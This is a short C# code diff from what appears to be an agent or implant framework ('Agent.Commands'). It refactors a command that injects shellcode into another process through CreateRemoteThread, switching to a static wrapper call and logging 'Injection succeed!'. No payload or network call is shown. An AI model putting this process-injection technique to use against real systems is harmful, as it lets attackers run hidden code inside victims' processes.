@@ -7,6 +7,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using WinAPI;
 using WinAPI.Wrapper;
 
 namespace Agent.Commands
@@ -31,11 +32,10 @@ namespace Agent.Commands
                 return;
             }
 
-            var winAPI = WinAPIWrapper.CreateInstance();
 
             try
             {
-                winAPI.Inject(process.Handle, IntPtr.Zero, shellcode, InjectionMethod.CreateRemoteThread);
+                APIWrapper.Inject(process.Handle, IntPtr.Zero, shellcode, InjectionMethod.CreateRemoteThread);
                 context.AppendResult($"Injection succeed!");
             }
             catch(Exception ex)
